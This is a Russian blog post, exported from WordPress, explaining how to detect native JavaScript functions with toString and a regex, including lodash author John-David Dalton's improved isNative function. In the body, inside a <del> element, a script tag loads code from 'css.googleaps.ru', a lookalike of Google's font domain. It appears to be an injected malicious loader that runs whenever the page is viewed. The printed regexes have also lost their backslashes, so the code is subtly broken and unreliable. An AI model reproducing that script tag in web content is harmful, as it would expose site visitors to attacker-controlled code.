---
layout: post
status: publish
published: true
title: Как в JavaScript определить, является ли функция нативной
author:
  display_name: Maxyc Webber
  login: admin
  email: maxycws@gmail.com
  url: ''
author_login: admin
author_email: maxycws@gmail.com
wordpress_id: 1485
wordpress_url: http://magazine.loc/%d0%b1%d0%b5%d0%b7-%d1%80%d1%83%d0%b1%d1%80%d0%b8%d0%ba%d0%b8/%d0%ba%d0%b0%d0%ba-%d0%b2-javascript-%d0%be%d0%bf%d1%80%d0%b5%d0%b4%d0%b5%d0%bb%d0%b8%d1%82%d1%8c-%d1%8f%d0%b2%d0%bb%d1%8f%d0%b5%d1%82%d1%81%d1%8f-%d0%bb%d0%b8-%d1%84%d1%83%
date: '2015-05-05 00:00:00 +0200'
date_gmt: '2015-05-05 00:00:00 +0200'
categories:
- Верстка
tags:
- ip
- javascript
- frontender
comments: []
---
<p>Время от времени мне приходится проверять, является ли та или иная<br />
функция нативной &mdash; это важная часть проверки, была ли функция предоставлена<br />
браузером или это порождение постороннего шима, замаскированное под встроенный<br />
компонент. Лучший способ выполнения такой проверки &mdash; это, конечно же, оценка<br />
значения <code>toString<&#47;code>, возвращённого функцией.</p>
<h2>JavaScript<&#47;h2><br />
Код, требуемый для этого, довольно прост:</p>
<pre><code>function isNative(fn) {<br />
    return (&#47;{s*[native code]s*}&#47;).test('' + fn);<br />
}<br />
<&#47;code><&#47;pre><br />
Вся суть состоит в том, чтобы конвертировать функцию в строчное представление и<br />
выполнить сопоставление строки с регулярными выражениями.<br />
<del>Лучшего способа подтвердить, что это нативная функция, не существует!<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;del></p>
<h2>Обновление!<&#47;h2><br />
Создатель библиотеки lodash, Джон-Дэвид Далтон (John-David Dalton), предложил<br />
<a href="https:&#47;&#47;gist.github.com&#47;jdalton&#47;5e34d890105aca44399f">лучшее решение<&#47;a>:</p>
<pre><code>;(function() {</p>
<p>  &#47;&#47; Используется для разложения на составляющие внутреннего `[[Class]]` значений<br />
  var toString = Object.prototype.toString;</p>
<p>  &#47;&#47; Используется для разложения на составляющие декомпилированного<br />
  &#47;&#47; исходного кода функции<br />
  var fnToString = Function.prototype.toString;</p>
<p>  &#47;&#47; Используется для определения конструкторов среды (Safari > 4;<br />
  &#47;&#47; по сути, предназначено специально для типизированных массивов)<br />
  var reHostCtor = &#47;^[object .+?Constructor]$&#47;;</p>
<p>  &#47;&#47; Составление регулярного выражения на основе часто употребляемого<br />
  &#47;&#47; нативного метода в качестве шаблона.<br />
  &#47;&#47; Выбираем `Object#toString`, так как вполне вероятно, что он ещё не задействован.<br />
  var reNative = RegExp('^' +<br />
    &#47;&#47; Применяем `Object#toString` к строке<br />
    String(toString)<br />
    &#47;&#47; Избавляемся от любых специальных символов регулярных выражений<br />
    .replace(&#47;[.*+?^${}()|[]&#47;]&#47;g, '$&amp;')<br />
    &#47;&#47; Заменяем упоминания `toString` на `.*?`, чтобы сохранить обобщённый вид шаблона.<br />
    &#47;&#47; Заменяем `for ...` и тому подобное для поддержки окружений вроде Rhino,<br />
    &#47;&#47; которые добавляют дополнительную информацию, такую как арность метода.<br />
    .replace(&#47;toString|(function).*?(?=\()| for .+?(?=\])&#47;g, '$1.*?') + '$'<br />
  );</p>
<p>  function isNative(value) {<br />
    var type = typeof value;<br />
    return type == 'function'<br />
      &#47;&#47; Используем `Function#toString`, чтобы обойти собственный метод<br />
      &#47;&#47; `toString` самого значения и избежать ложного результата.<br />
      ? reNative.test(fnToString.call(value))<br />
      &#47;&#47; На всякий случай выполняем проверку на наличие объектов среды, так<br />
      &#47;&#47; как некоторые окружения могут представлять компоненты вроде<br />
      &#47;&#47; типизированных массивов как методы DOM, что может не соответствовать<br />
      &#47;&#47; нормальному нативному паттерну.<br />
      : (value &amp;&amp; type == 'object' &amp;&amp; reHostCtor.test(toString.call(value))) || false;<br />
  }</p>
<p>  &#47;&#47; экспортируем в удобном для вас виде<br />
  module.exports = isNative;<br />
}());<br />
<&#47;code><&#47;pre><br />
И вот теперь у нас точно есть лучший подход для определения, является ли метод нативным.<br />
Естественно, не стоит использовать его для обеспечения безопасности &mdash; это лишь признак того,<br />
что функция нативна.</p>
<p><img src="http:&#47;&#47;feeds.feedburner.com&#47;~r&#47;FrontenderMagazineArticles&#47;~4&#47;h2KQf0R1Niw" alt="" width="1" height="1" &#47;><br />
Source: http:&#47;&#47;frontender.info&#47;</p>
